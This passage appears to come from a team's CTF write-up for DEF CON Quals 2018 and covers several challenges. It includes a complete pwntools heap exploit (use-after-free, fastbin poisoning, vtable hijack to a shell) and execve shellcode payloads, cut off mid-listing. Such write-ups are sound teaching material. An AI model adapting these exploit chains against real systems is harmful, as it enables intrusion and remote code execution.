let\u0026rsquo;s try something simpler (and if it fails, move to more advanced but computationally intensive stuff). The suspect here is that the network is trained on a small dataset, and is strongly overfitting the flag on some of the \u0026ldquo;low\u0026rdquo; neurons. This could maybe mean that the function we need to optimize is not crazily non-linear and with tons of local optima that require complex optimization algorithms to escape from. Therefore we tried with a simple greedy strategy: for each of the 38 positions, pick the letter that maximizes the output of the target neuron. And it worked!\nTrying OOO as a test string showed activation of neurons 2 and 3 - let\u0026rsquo;s focus on them.\nResults # Neuron 2 has been our first guess, which gave us these (highly noisy) strings, with the greedy strategy:\nOOOOTHISISBYKCOZMEKKAGETONASTEYOUATIMW OOOOTHISISBYKCOZMKYKAGZTONBSTWVOUATIWM OOOOTNISISBDKCOZMKSGBGETONMSTXVOUWTIRR OOOOTOISISOYECOIUEYSOGETONOSTNVOUOTIWW We tried (failing) to submit some flags like\nOOOOTHISISBYKCOZMESSAGETOHASTEYOLATINE OOOOTHISISBYKCOZMESSAGETOHASTEYOLATINW \u0026hellip; After realizing that neuron 2 was just a test-neuron, we changed output neuron from 2nd to 3rd and we got sentences like:\nOGOSOMEAUTHTNTICINTEIXIGXNCCISVEGUIWEG OOOSOMRAUTHGNTICINTGIIIGGNGGISMRGUIWEG OOOSOMXAUTHENTICINTEKXIGXNCRISRRRRIRER OOOSOYEOLTUTNTICINTEIIIGCNCEIIETOLIRTI RROSOMEAUTHTNTICINTEIXIGXNCCISVEGUIWEG We obtained OOOSOMEAUTHENTICINTELLIGENCEIS........ by averaging (and manually correcting) them and after few tries of guessing ( :bowtie: ) the last word we obtained the correct flag: OOOSOMEAUTHENTICINTELLIGENCEISREQUIRED.\nPython script # You can find here the full python script we have used (keras + tensorflow-gpu):\n#!/usr/bin/env python import numpy as np from keras.models import load_model from keras.preprocessing import image from keras.datasets import mnist from keras.applications.resnet50 import preprocess_input, decode_predictions from PIL import Image, ImageDraw, ImageFont import string, random, sys dataset=[] datalet=[] datax={} dataname=[\u0026#34;RUNNEISOSTRICHESOWNINGMUSSEDPURIMSCIVI\u0026#34;, \u0026#34;MOLDERINGIINTELSDEDUCINGCOYNESSDEFIECT\u0026#34;, \u0026#34;AMADOFIXESINSTIIIINGGREEDIIVDISIOCATIN\u0026#34;, \u0026#34;HAMIETSENSITIZINGNARRATIVERECAPTURINGU\u0026#34;, \u0026#34;ELECTROENCEPHALOGRAMSPALATECONDOIESPEN\u0026#34;, \u0026#34;SCHWINNUFAMANAGEABLECORKSSEMICIRCLESSH\u0026#34;, \u0026#34;BENEDICTTURGIDITYPSYCHESPHANTASMAGORIA\u0026#34;, \u0026#34;TRUINGAIKALOIDSQUEILRETROFITBIEARIESTW\u0026#34;, \u0026#34;KINGFISHERCOMMONERSUERIFIESHORNETAUSTI\u0026#34;, \u0026#34;LIQUORHEMSTITCHESRESPITEACORNSGOALREDI\u0026#34;] for i in range(0,8): img = Image.open(\u0026#39;./sample_%d.png\u0026#39;%i) for j in range(0,38): x=img.crop((j*28,0,(j+1)*28,28)) dataset.append(x) datalet.append(dataname[i][j]) let=dataname[i][j] if let not in datax: datax[let] = [] datax[let].append(len(dataset)-1) def genImg(n): img = Image.new(\u0026#39;1\u0026#39;, (1064,28), color=\u0026#39;black\u0026#39;) #for i in range(max(0,len(n)-1),len(n)): # only this letter and everything else black for i in range(0,len(n)): img.paste(dataset[n[i]], (i*28,0)) return img model = load_model(\u0026#39;model.h5\u0026#39;) model.compile(loss=\u0026#39;binary_crossentropy\u0026#39;, optimizer=\u0026#39;rmsprop\u0026#39;, metrics=[\u0026#39;accuracy\u0026#39;]) def eeval2(a, op): img = genImg(a) x = image.img_to_array(img) x = np.expand_dims(x, axis=0) classes = model.predict(x) score = float(classes[0][op]) return score for oo in range(2,40): # start from 2, this one seems correct # out=[datax[x][0] for x in \u0026#39;OOOSOMEAUTHENTICINTELLIGENCEIS\u0026#39;] #do not start from zero out=[] for i in range(len(out),38): maxv=([], -99999) for j in datax: for k in datax[j]: out.append(k) score = eeval2(out, oo) if score \u0026gt; maxv[1]: maxv = (0, score, j) out.pop() sys.stdout.write(\u0026#34;[%d] %38s : %.10lf \\r\u0026#34; % (oo, \u0026#39;\u0026#39;.join([datalet[x] for x in out]), maxv[1])) sys.stdout.flush() out.append(datax[maxv[2]][0]) print(\u0026#34;\u0026#34;) print(\u0026#34;--Neuron %d: %s\u0026#34; % (oo, \u0026#39;\u0026#39;.join([datalet[x] for x in out]))) Geckome # Another web challenge, this time served at http://d2b24dd8.quals2018.oooverflow.io. After logging in with the provided credentials admin@oooverflow.io:admin, we are redirected to the following browser test page:\n\u0026lt;html\u0026gt; \u0026lt;head\u0026gt; \u0026lt;title\u0026gt;Testing the browser...\u0026lt;/title\u0026gt; \u0026lt;style\u0026gt; #animated_div { width:120px; height:47px; background: #92B901; color: #ffffff; position: relative; font-weight:bold; font-size:20px; padding:10px; -webkit-animation:animated_div 5s 1; border-radius:5px; -webkit-border-radius:5px; } @-webkit-keyframes animated_div { 0% {-webkit-transform: rotate(0deg);left:0px;} 25% {-webkit-transform: rotate(20deg);left:0px;} 50% {-webkit-transform: rotate(0deg);left:500px;} 55% {-webkit-transform: rotate(0deg);left:500px;} 70% {-webkit-transform: rotate(0deg);left:500px;background:#1ec7e6;} 100% {-webkit-transform: rotate(-360deg);left:0px;} } \u0026lt;/style\u0026gt; \u0026lt;/head\u0026gt; \u0026lt;video id=\u0026#34;v\u0026#34; autoplay\u0026gt; \u0026lt;/video\u0026gt; \u0026lt;a href=\u0026#34;https://www.w3schools.com/html\u0026#34; ping=\u0026#34;https://www.w3schools.com/trackpings\u0026#34;\u0026gt; \u0026lt;p onclick=\u0026#34;p()\u0026#34;\u0026gt;Click me to print the page.\u0026lt;/p\u0026gt; \u0026lt;link rel=\u0026#34;prerender\u0026#34; href=\u0026#34;https://news.ycombinator.com/\u0026#34;\u0026gt; \u0026lt;div id=\u0026#34;animated_div\u0026#34;\u0026gt;OOOverflow Securityyy\u0026lt;/div\u0026gt; \u0026lt;script\u0026gt; var f = \u0026#34;\u0026#34;; if (navigator.onLine) f += \u0026#34;o\u0026#34;; f += navigator.vendor; function p() { window.print(); } /* incompatible window.onbeforeprint = function () { // some code } */ f += navigator.mimeTypes.length; x=0; for ( i in navigator ) { x += 1; } f += x; x=0; for ( i in window ) { x += 1; } f += x; // hash function str2ab(str) { var buf = new ArrayBuffer(str.length*2); // 2 bytes for each char var bufView = new Uint16Array(buf); for (var i=0, strLen=str.length; i\u0026lt;strLen; i++) { bufView[i] = str.charCodeAt(i); } return buf; } function sha256(str) { // We transform the string into an arraybuffer. var buffer = str2ab(str); return crypto.subtle.digest({name:\u0026#34;SHA-256\u0026#34;}, buffer).then(function (hash) { return hex(hash); }); } function hex(buffer) { var hexCodes = []; var view = new DataView(buffer); for (var i = 0; i \u0026lt; view.byteLength; i += 4) { // Using getUint32 reduces the number of iterations needed (we process 4 bytes each time) var value = view.getUint32(i) // toString(16) will give the hex representation of the number without padding var stringValue = value.toString(16) // We use concatenation and slice for padding var padding = \u0026#39;00000000\u0026#39; var paddedValue = (padding + stringValue).slice(-padding.length) hexCodes.push(paddedValue); } // Join all the hex strings into one return hexCodes.join(\u0026#34;\u0026#34;); } f += navigator.plugins[0].filename; f += navigator.plugins[1].description; sha256(f).then(function(digest) { if (digest == \u0026#34;31c6b7c46ff55afc8c5e64f42cc9b48dde6a04b5ca434038cd2af8bd3fd1483a\u0026#34;) { window.location = \u0026#34;flag.php?f=\u0026#34; +btoa(f); } else { x = document.getElementById(\u0026#34;animated_div\u0026#34;); z = document.createElement(\u0026#34;div\u0026#34;); z.innerHTML = \u0026#34;Test Failed\u0026#34;; z.id=\u0026#34;animated_div\u0026#34;; setTimeout(function() {x.appendChild(z)}, 5000); } }); console.log(\u0026#34;FIN\u0026#34;); \u0026lt;/script\u0026gt; \u0026lt;/html\u0026gt; A quick overview of the inline script suggests that the flag can be accessed by the admin iff a matching browser is used. The client is checked for the presence of certain plugins, the ability to execute selected APIs outside secure-contexts such as SubtleCrypto and lack of support for window.onbeforeprint (see the commented out code in the js). Moreover, several -webkit- prefixed CSS rules wink at WebKit-powered user agents.\nBy cross-checking all the conditions, the list of possible candidates reduced to Google Chrome between versions 37 and 39 (included). At this point it was just a matter of running these old browsers inside a VM, dump the list of plugins along with other features exploited by the fingerprinting function and use a bit of (brute) force.\nimport hashlib import sys h = \u0026#39;31c6b7c46ff55afc8c5e64f42cc9b48dde6a04b5ca434038cd2af8bd3fd1483a\u0026#39; mime_types = range(0, 10) navigator = range(0, 46) windows = range(150, 231) vendors = [\u0026#39;Google Inc.\u0026#39;] plugin0_filenames = [\u0026#39;\u0026#39;, \u0026#39;libwidevinecdmadapter.so\u0026#39;, \u0026#39;libppGoogleNaClPluginChrome.dll\u0026#39;, \u0026#39;undefined\u0026#39;, \u0026#39;libpepflashplayer.dll\u0026#39;, \u0026#39;libppGoogleNaClPluginChrome.so\u0026#39;, \u0026#39;internal-remoting-viewer\u0026#39;, \u0026#39;libpepflashplayer.so\u0026#39;, \u0026#39;internal-nacl-plugin\u0026#39;, \u0026#39;internal-pdf-viewer\u0026#39;, \u0026#39;mhjfbmdgcfjbbpaeojofohoefgiehjai\u0026#39;, \u0026#39;libwidevinecdmadapter.dll\u0026#39;, \u0026#39;libpdf.so\u0026#39;, \u0026#39;libpdf.dll\u0026#39;] plugin1_descr = [\u0026#39;\u0026#39;, \u0026#39;This plugin allows you to securely access other computers that have been shared with you. To use this plugin you must first install the \u0026lt;a href=\u0026#34;https://chrome.google.com/remotedesktop\u0026#34;\u0026gt;Chrome Remote Desktop\u0026lt;/a\u0026gt; webapp.\u0026#39;, \u0026#39;undefined\u0026#39;, \u0026#39;Shockwave Flash 14.0 r0\u0026#39;, \u0026#39;Enables Widevine licenses for playback of HTML audio/video content.\u0026#39;, \u0026#39;Portable Document Format\u0026#39;, \u0026#39;Enables Widevine licenses for playback of HTML audio/video content. (version: Something fresh)\u0026#39;] + [\u0026#39;Shockwave Flash {}.{} r0\u0026#39;.format(maj, mino) for maj in range(18) for mino in range(5)] for ven in vendors: for mt in mime_types: for nav in navigator: for win in windows: for p0 in plugin0_filenames: for p1 in plugin1_descr: # simulate utf-16 encoding data = \u0026#39;\u0026#39;.join(c+\u0026#39;\\x00\u0026#39; for c in \u0026#39;o{}{}{}{}{}{}\u0026#39;.format(ven, mt, nav, win, p0, p1)) if h == hashlib.sha256(data).hexdigest(): print(\u0026#39;[FOUND] {}\u0026#39;.format(data)) sys.exit(0) The script returns the string oGoogle Inc.828186libpepflashplayer.soThis plugin allows you to securely access other computers that have been shared with you. To use this plugin you must first install the \u0026lt;a href=\u0026quot;https://chrome.google.com/remotedesktop\u0026quot;\u0026gt;Chrome Remote Desktop\u0026lt;/a\u0026gt; webapp. that can be used, in a base64-encoded form, to access the flag:\n$ curl \u0026#39;http://d2b24dd8.quals2018.oooverflow.io/flag.php?f=b0dvb2dsZSBJbmMuODI4MTg2bGlicGVwZmxhc2hwbGF5ZXIuc29UaGlzIHBsdWdpbiBhbGxvd3MgeW91IHRvIHNlY3VyZWx5IGFjY2VzcyBvdGhlciBjb21wdXRlcnMgdGhhdCBoYXZlIGJlZW4gc2hhcmVkIHdpdGggeW91LiBUbyB1c2UgdGhpcyBwbHVnaW4geW91IG11c3QgZmlyc3QgaW5zdGFsbCB0aGUgPGEgaHJlZj0iaHR0cHM6Ly9jaHJvbWUuZ29vZ2xlLmNvbS9yZW1vdGVkZXNrdG9wIj5DaHJvbWUgUmVtb3RlIERlc2t0b3A8L2E+IHdlYmFwcC4=\u0026#39; OOO{th3r3c@nb30nly0n3br0ws3r!} Flag: OOO{th3r3c@nb30nly0n3br0ws3r!}\nGhettohackers: Throwback # A .txt file is provided with the following content:\nAnyo!e!howouldsacrificepo!icyforexecu!!onspeedthink!securityisacomm!ditytop!urintoasy!tem! Given that our brains have been compromised since a long time by playing too many CTFs, we quickly figured out that it was enough to count the number of chars before each ! to get the index of a single letter of the flag. For instance, Anyo! = d because there are 4 chars before the ! and so we must consider the 4th letter of the English alphabet.\nPython one-liner to solve the challenge:\n\u0026gt;\u0026gt;\u0026gt; import string \u0026gt;\u0026gt;\u0026gt; s = \u0026#39;Anyo!e!howouldsacrificepo!icyforexecu!!onspeedthink!securityisacomm!ditytop!urintoasy!tem!\u0026#39; \u0026gt;\u0026gt;\u0026gt; \u0026#39;\u0026#39;.join(string.ascii_lowercase[len(c)-1] if c else \u0026#39; \u0026#39; for c in s.split(\u0026#39;!\u0026#39;)).rstrip() \u0026#39;dark logic\u0026#39; Flag: dark logic\nIt\u0026rsquo;s-a me! # We\u0026rsquo;re given an x64 Linux ELF, written in C++, with full RELRO, stack canaries, NX, and PIE. We can create users, order and cook pizzas and so on. To order pizzas, ingredients are specified using UTF-8 sequences. When cooking pizzas, we can specify an explanation, which will be allocated on the heap (with a dynamic size depending on the input size).\nWe notice that it is apparently impossible to order a pineapple pizza (sequence \\xf0\\x9f\\x8d\\x8d). However, we can order a pizza with ingredients \\xf0\\xf0\\xf0\\x9f and \\x8d\\x8d, which are valid sequences and will be concantenated when cooking, creating the pineapple ingredient. After cooking a pineapple pizza, Mario gets mad at us. We can log out, or edit our explanation (which logs us out afterwards). From the logged out menu, we can see the explanation we gave.\nThere is a use-after-free here. When cooking, if we carefully set up an order (e.g., 16 pineapple pizzas and 1 tomato pizza), we can make the program free the explanation buffer while keeping a pointer to it for editing and printing. Also, the editing size is fixed (300), while the actual size of the once-allocated explanation can vary, so there\u0026rsquo;s an overflow, too (we didn\u0026rsquo;t use it).\nWe first print out a freed explanation unsorted bin to leak the heap (there\u0026rsquo;s another freed unsorted due to vector resizing). Then, we edit an unsorted bin\u0026rsquo;s links to write main_arena into the explanation itself at the next malloc. By printing the explanation, we leak libc. Finally, we allocate and free an explanation with the same size as a pizza object, then get a pizza allocated in that free fastbin and leak the binary\u0026rsquo;s base through the vtable pointer.\nThen, we edit a fastbin-sized free explanation to link a fake fastbin in BSS, near the currently logged user pointer. After setting up a fake user and a bunch of related fake structures in buffers residing in BSS, we overwrite the current user with the fake one through the fake fastbin. Finally, the admire option in the user menu can be used to trigger a virtual method invocation on a fake pizza belonging to the fake user. The fake vtable of the pizza will call a onegadget, popping a shell.\nExploit:\n#!/usr/bin/env python2 from pwn import * from pow import solve_pow context(arch=\u0026#39;x86_64\u0026#39;, os=\u0026#39;linux\u0026#39;) def pow_connect(): p.recvuntil(\u0026#39;Challenge: \u0026#39;) challenge = p.recvline().strip() p.recvuntil(\u0026#39;n: \u0026#39;) n = int(p.recvline()) prog = log.progress(\u0026#39;Solving PoW ({} {})\u0026#39;.format(challenge, n)) sol = solve_pow(challenge, n) prog.success(\u0026#39;found {}\u0026#39;.format(sol)) p.recvuntil(\u0026#39;Solution: \\n\u0026#39;) p.sendline(str(sol)) #context.log_level = \u0026#39;debug\u0026#39; #p = process(\u0026#39;./mario\u0026#39;) p = remote(\u0026#39;83b1db91.quals2018.oooverflow.io\u0026#39;, 31337) pow_connect() def menu(choice): p.recvuntil(\u0026#39;Choice: \u0026#39;) p.sendline(choice) # MAIN MENU def new_customer(name): menu(\u0026#39;N\u0026#39;) p.recvuntil(\u0026#39;name? \u0026#39;) p.sendline(name) def login(name): menu(\u0026#39;L\u0026#39;) p.recvuntil(\u0026#39;name? \u0026#39;) p.sendline(name) def why_upset(): menu(\u0026#39;W\u0026#39;) p.recvuntil(\u0026#39;say: \u0026#39;) tail = \u0026#39;\\nniente scuse\\n\u0026#39; return p.recvuntil(tail)[:-len(tail)] # USER MENU def logout(): menu(\u0026#39;L\u0026#39;) def order(pizzas): menu(\u0026#39;O\u0026#39;) p.recvuntil(\u0026#39;pizzas? \u0026#39;) p.sendline(str(len(pizzas))) for pizza in pizzas: p.recvuntil(\u0026#39;ingredients? \u0026#39;) p.sendline(str(len(pizza))) for i in pizza: p.recvuntil(\u0026#39;: \u0026#39;) p.sendline(i) def cook(explanation=\u0026#39;\u0026#39;): menu(\u0026#39;C\u0026#39;) p.recvuntil(\u0026#39;explain: \u0026#39;) p.sendline(explanation) def admire(): menu(\u0026#39;A\u0026#39;) def explain(explanation): menu(\u0026#39;P\u0026#39;) p.recvuntil(\u0026#39;yourself: \u0026#39;) p.sendline(explanation) def go_away(): menu(\u0026#39;Y\u0026#39;) TOMATO = \u0026#39;\\xf0\\x9f\\x8d\\x85\u0026#39; PINEAPPLE_PIZZA = [\u0026#39;\\xf0\\xf0\\xf0\\x9f\u0026#39;, \u0026#39;\\x8d\\x8d\u0026#39;] FREED_EXPLANATION_ORDER = [PINEAPPLE_PIZZA] * 16 + [[TOMATO]] prog = log.progress(\u0026#39;Leaking heap\u0026#39;) # leak fd from unsorted bin through UAF # fd points to heap because the pizza vector reallocation freed # a (now) unsorted chunk before us new_customer(\u0026#39;heapleak\u0026#39;) order(FREED_EXPLANATION_ORDER) cook(\u0026#39;A\u0026#39; * 200) go_away() heap_leak = u64(why_upset().ljust(8, \u0026#39;\\x00\u0026#39;)) prog.success(\u0026#39;~ 0x{:012x}\u0026#39;.format(heap_leak)) prog = log.progress(\u0026#39;Leaking libc\u0026#39;) # corrupt an explanation\u0026#39;s unsorted fd to \u0026amp;explanation-0x10 new_customer(\u0026#39;libcleak\u0026#39;) order(FREED_EXPLANATION_ORDER) cook(\u0026#39;A\u0026#39; * 200) explain(p64(heap_leak + 0x4b0 - 0x10)[:6]) # allocate a chunk to write main_arena to *(fd+0x10) -\u0026gt; explanation new_customer(\u0026#39;unsorted\u0026#39;) logout() # leak main_arena through the explanation libc_base = u64(why_upset().ljust(8, \u0026#39;\\x00\u0026#39;)) - 0x3c4c48 prog.success(\u0026#39;@ 0x{:012x}\u0026#39;.format(libc_base)) prog = log.progress(\u0026#39;Leaking PIE \u0026#39;) # get a 0x40 free leakable explanation chunk new_customer(\u0026#39;binleak\u0026#39;) order(FREED_EXPLANATION_ORDER) cook(\u0026#39;B\u0026#39; * 0x37) go_away() # allocate a bad pizza (0x40 chunk) over the explanation new_customer(\u0026#39;badpizza\u0026#39;) order([[\u0026#39;X\u0026#39;]] * 10) cook() logout() # leak the binary through the bad pizza\u0026#39;s vtable ptr bin_base = u64(why_upset().ljust(8, \u0026#39;\\x00\u0026#39;)) - 0x20bbe0 prog.success(\u0026#39;@ 0x{:012x}\u0026#39;.format(bin_base)) NAME_ADDR = bin_base + 0x20c5e0 EXPLANATION_ADDR = bin_base + 0x20c480 prog = log.progress(\u0026#39;Hijacking vtable\u0026#39;) # link a fake 0x20 fastbin just before the upset and logged user ptrs in BSS FAKE_FAST_ADDR = EXPLANATION_ADDR + 0x120 new_customer(\u0026#39;fakefast\u0026#39;) order(FREED_EXPLANATION_ORDER) cook(\u0026#39;\\x00\u0026#39;*0x128 + \u0026#39;\\x21\u0026#39;) explain(p64(FAKE_FAST_ADDR)[:6]) # we lay out fake structures in the BSS name buffer USER_ADDR = NAME_ADDR + 8 PIZZA_PTR_ARRAY_ADDR = USER_ADDR + 0x48 PIZZA_ADDR = PIZZA_PTR_ARRAY_ADDR + 8 VTABLE_ADDR = PIZZA_ADDR + 0x18 # fake vtable for a pizza, calls onegadget from admire ONE_GADGET = libc_base + 0x4526a vtable = p64(ONE_GADGET) # fake pizza, with our fake vtable pizza = p64(VTABLE_ADDR) + \u0026#39;A\u0026#39;*16 # fake array of pizzas, with our fake pizza pizza_ptr_array = p64(PIZZA_ADDR) # fake list for pizza_ptr_array pizza_list = p64(PIZZA_PTR_ARRAY_ADDR) # begin ptr pizza_list += p64(PIZZA_PTR_ARRAY_ADDR+8) # end ptr pizza_list += \u0026#39;\\x00\u0026#39;*8 # fake user, with pizza_list user = \u0026#39;\\x00\u0026#39;*(8+0x18+8) # name, uncooked pizzas, explanation user += pizza_list # list of cooked pizzas user += \u0026#39;\\x00\u0026#39;*8 # ensure invalid user flag = 0 # throw everything into the BSS name buffer # strlen = 0 -\u0026gt; waste an 0x20 fastbin, bringing our fake fastbin to head new_customer(\u0026#39;\\x00\u0026#39;*8 + user + pizza_ptr_array + pizza + vtable) # will allocate explanation on fake fastbin # overwrite logged user ptr with fake user cook(\u0026#39;A\u0026#39;*8 + p64(USER_ADDR)[:6]) # invoke onegadget via fake vtable admire() prog.success(\u0026#39;pwned!\u0026#39;) p.recvline() p.interactive() Note Oriented Programming # We had remote access to the challenge and we\u0026rsquo;ve been provided with the executable nop.\nWe could only insert some integer values that after certain operations became strings representing notes and octaves. We could execute \u0026rsquo;notes\u0026rsquo; from A0 to G#8. Seems like we have to craft a musical shellcode!\nReversing # The program allocates two sections at 0x40404000, and 0x60606000:\nIt will store the user input in the first section -that we will call USER_INPUT- and a set of musical notes expressed in alphabetical notation in the latter -that we will call CODE as the program will jump to it to play our song-.\n0x40404000 0x40405000 rw-p 1000 0 0x565a6000 0x565a7000 r-xp 1000 0 /home/mhackeroni/ctf/defconquals18/nop/nop 0x565a7000 0x565a8000 r--p 1000 0 /home/mhackeroni/ctf/defconquals18/nop/nop 0x565a8000 0x565a9000 rw-p 1000 1000 /home/mhackeroni/ctf/defconquals18/nop/nop 0x60606000 0x60608000 rwxp 2000 0 After reading the user input, it will starts processing it by reading a word at a time, and translate each word into the a set of notes (e.g., G#0, B7) into the CODE section: the program will stop parsing notes at the first \\xff\\xff, but will stop reading our inputs at the first \\x00\\x00: an extremely valuable feature allowing us to have an unconstrained user input at a specific location.\nBefore the shellcode, the program puts a small stub that cleans useful registers, and copies ESP in ESI and EDI. An int 80 will be concatenated at the end of our code.\nShellcoding # Our first aim was to retrieve a list of all the instructions we could use. We combined several notes and disassembled them with capstone in order to have some useful \u0026ldquo;gadget\u0026rdquo; to build the shellcode.\nfrom math import log from collections import defaultdict from capstone import * import itertools import re fmin = 27 fmax = 26590 notes_array = [\u0026#39;A\u0026#39;, \u0026#39;A#\u0026#39;, \u0026#39;B\u0026#39;, \u0026#39;C\u0026#39;, \u0026#39;C#\u0026#39;, \u0026#39;D\u0026#39;, \u0026#39;D#\u0026#39;, \u0026#39;E\u0026#39;, \u0026#39;F\u0026#39;, \u0026#39;F#\u0026#39;, \u0026#39;G\u0026#39;, \u0026#39;G#\u0026#39;] def tonote(freq): v3 = log(float(freq) / 27.5, 2) * 12.0 + 0.5; v3 = int(v3) note = \u0026#34;%s%d\u0026#34; % (notes_array[v3 % 12], (v3 / 12)); return note gadgets = defaultdict(list) gadgets_reverse = defaultdict(list) for f in range(fmin, fmax): gadgets[tonote(f)].append(f) gadgets_reverse[f].append(tonote(f)) md = Cs(CS_ARCH_X86, CS_MODE_32) baseaddr = 0x60606000 def disasm(code, address): instructions = \u0026#39;\u0026#39; regex = r\u0026#39;ptr \\[e[bcd]x\u0026#39; size = 0 for i in md.disasm(code, address): size += i.size instructions += \u0026#39;%s %s; \u0026#39; % (i.mnemonic, i.op_str) if re.findall(regex, i.op_str): return None if size != len(code): return None return instructions instructions = defaultdict(dict) for k in itertools.combinations(gadgets.keys(), 3): ins = disasm(\u0026#39;\u0026#39;.join(k), baseaddr) if ins is None: continue print \u0026#39;\\\u0026#39;%s\\\u0026#39; #%s\u0026#39; % (\u0026#39;\u0026#39;.join(k), ins) for k in instructions.keys(): for l in instructions[k].keys(): print \u0026#34;%s %s\u0026#34; % (k, l) There are no mov nor push and pop gadgets, only a few inc, some xor, and a couple and.\nUnfortunately, the only control we excert over esi and edi is via the and instruction, like:\n169:\u0026#39;G6A#0\u0026#39; #inc edi; inc ecx; and esi, dword ptr [eax]; 170:\u0026#39;G6A#7\u0026#39; #inc edi; inc ecx; and esi, dword ptr [edi]; Although we were able to write bytes into the stack, the biggest problem for us was to write the right address into the right register so to call another read() or an execve().\nSince we weren\u0026rsquo;t provided with enough instructions to set the registers like ecx and ebx, we all agreed on the fact that our exploit had to be done in two stages and that the first stage had to change bytes in the CODE section.\nWe all decided to use a mask like 0x6060ff0 to make esi point to our CODE section, and used it to xor the instruction we needed into our NOP sled. Challenging ASLR will make our exploits not 100% reliable.\nOh, and since we are tough guys, we went straight for an execve().\nThree different Exploits # At a certain point in the night we realized we could write (\\x00\\x00 excluded for obviuos reasons) every byte we wanted between \\xff\\xff and \\x00\\x00 in the USER_INPUT section.\nThat\u0026rsquo;s when we started coming up with different ideas. We split in three and developed three different working exploits.\nOne exploit was based on the use of the stack, the other two took advantage of the USER_INPUT section.\nIn order to set eax and al to the desired values we wrote a clever solver in z3 that used values that could be found in the stack.\nFirst Exploit # The first idea was to xor values on the stack to write the mask, /bin//sh, and mov ebx, edi. Then we would set edi to point to /bin//sh and write the byte for mov ebx, edi into the nop sled.\nfrom pwn import * ############### IDEA ################ #Want to change part of the stack in this way #Before # OOOOOOOOOOOO---- Welcome to Note Oriented Programming!! ----OOOOOOOOOOOOOOOOOOOO #After # OOOOOOOOOOOO---- Welcome to Note O\\x00\\x65\\x60\\x60ted Progra/bin//sh\\x00---\\x89\\xfb\\x90 OOOOOOOOOOOOOOOOO #And between 0x60606500 and esi (may ASLR be with us) #Set edi to point to /bin//sh #Change the first 4 byte of the new esi pointer into 89fb(mov ebx, edi) #Finally set the value of eax to 0xb and place useless instructions in order to change a part of them with the mov. #Writing /bin//sh payload = \u0026#34;\\x30\\x00\\x2b\\x00\u0026#34; * 43 payload += \u0026#34;\\x3b\\x02\\x1e\\x00\\x36\\x5f\u0026#34; payload += \u0026#34;\\xfa\\x02\\x78\\x00\\x36\\x5f\u0026#34; payload += \u0026#34;\\x24\\x00\\x36\\x5f\u0026#34; payload += \u0026#34;\\x2b\\x00\\x2b\\x00\u0026#34; * 25 payload += \u0026#34;\\xaa\\x00\\x2b\\x00\u0026#34; payload += \u0026#34;\\x3b\\x02\\xb8\\x1a\\x36\\x5f\\x3b\\x02\\xfe\\x1d\\x36\\x5f\u0026#34; payload += \u0026#34;\\x8f\\x00\\xce\\x17\u0026#34; payload += \u0026#34;\\x24\\x00\\x36\\x5f\\xbf\\x00\\x9b\\x2f\u0026#34; payload += \u0026#34;\\x36\\x5f\\xbf\\x00\u0026#34; payload += \u0026#34;\\x36\\x5f\\xbf\\x00\u0026#34; payload += \u0026#34;\\x8f\\x00\\x9b\\x0a\u0026#34; payload += \u0026#34;\\xfa\\x02\\xfb\\x3b\\x36\\x5f\u0026#34; payload += \u0026#34;\\xfa\\x02\\x54\\x47\\x36\\x5f\u0026#34; payload += \u0026#34;\\x24\\x00\\xce\\x17\u0026#34; payload += \u0026#34;\\x30\\x00\\x36\\x5f\u0026#34; payload += \u0026#34;\\x3b\\x02\\xd3\\x54\\x36\\x5f\u0026#34; payload += \u0026#34;\\x24\\x00\\xce\\x17\u0026#34; payload += \u0026#34;\\x8f\\x00\\x2b\\x00\u0026#34; payload += \u0026#34;\\x8f\\x00\\x54\\x01\u0026#34; payload += \u0026#34;\\x3b\\x02\\x10\\x50\\x36\\x5f\u0026#34; payload += \u0026#34;\\x30\\x00\\xce\\x17\u0026#34; payload += \u0026#34;\\xd3\\x54\\x36\\x5f\u0026#34; * 11 payload += \u0026#34;\\x8f\\x00\\xd3\\x54\u0026#34; payload += \u0026#34;\\xfa\\x02\\x70\\x35\\x36\\x5f\u0026#34; payload += \u0026#34;\\xfa\\x02\\x8c\\x3f\\x36\\x5f\u0026#34; payload += \u0026#34;\\x8f\\x00\\x9b\\x2f\u0026#34; payload += \u0026#34;\\x30\\x00\\xe7\\x0b\u0026#34; #Writing 0x60606500 payload += \u0026#34;\\x8f\\x00\\x9b\\x2f\u0026#34; payload += \u0026#34;\\x8f\\x00\\xa7\\x02\u0026#34; payload += \u0026#34;\\x24\\x00\\xa7\\x02\u0026#34; payload += \u0026#34;\\x8f\\x00\\x60\\x00\u0026#34; payload += \u0026#34;\\x8f\\x00\\x2b\\x00\u0026#34; payload += \u0026#34;\\x3b\\x02\\xd3\\x54\\x36\\x5f\u0026#34; payload += \u0026#34;\\x24\\x00\\xaa\\x00\u0026#34; payload += \u0026#34;\\x8f\\x00\\xf4\\x05\u0026#34; payload += \u0026#34;\\x8f\\x00\\xaa\\x00\u0026#34; payload += \u0026#34;\\xfa\\x02\\x8c\\x3f\\x36\\x5f\u0026#34; payload += \u0026#34;\\xfa\\x02\\xfb\\x3b\\x36\\x5f\u0026#34; payload += \u0026#34;\\x8f\\x00\\x55\\x00\u0026#34; payload += \u0026#34;\\x24\\x00\\x55\\x00\u0026#34; payload += \u0026#34;\\x8f\\x00\\x4e\\x05\u0026#34; payload += \u0026#34;\\xfa\\x02\\x8c\\x3f\\x36\\x5f\u0026#34; payload += \u0026#34;\\xfa\\x02\\x10\\x50\\x36\\x5f\u0026#34; payload += \u0026#34;\\x8f\\x00\\xaa\\x00\u0026#34; payload += \u0026#34;\\x24\\x00\\xa7\\x02\u0026#34; payload += \u0026#34;\\x24\\x00\\xaa\\x00\u0026#34; payload += \u0026#34;\\x8f\\x00\\xa7\\x02\u0026#34; payload += \u0026#34;\\x8f\\x00\\x9b\\x0a\u0026#34; payload += \u0026#34;\\x24\\x00\\xaa\\x00\u0026#34; payload += \u0026#34;\\x24\\x00\\x54\\x01\u0026#34; payload += \u0026#34;\\x8f\\x00\\x9b\\x0a\u0026#34; payload += \u0026#34;\\x8f\\x00\\xa7\\x02\u0026#34; payload += \u0026#34;\\x24\\x00\\x54\\x01\u0026#34; payload += \u0026#34;\\x8f\\x00\\x54\\x01\u0026#34; #Writing 89, bf and 90 payload += \u0026#34;\\xbf\\x00\\xf4\\x05\u0026#34; payload += \u0026#34;\\x24\\x00\\xf4\\x05\u0026#34; payload += \u0026#34;\\x24\\x00\\xe7\\x0b\u0026#34; payload += \u0026#34;\\x24\\x00\\xce\\x17\u0026#34; payload += \u0026#34;\\x8f\\x00\\x9b\\x2f\u0026#34; payload += 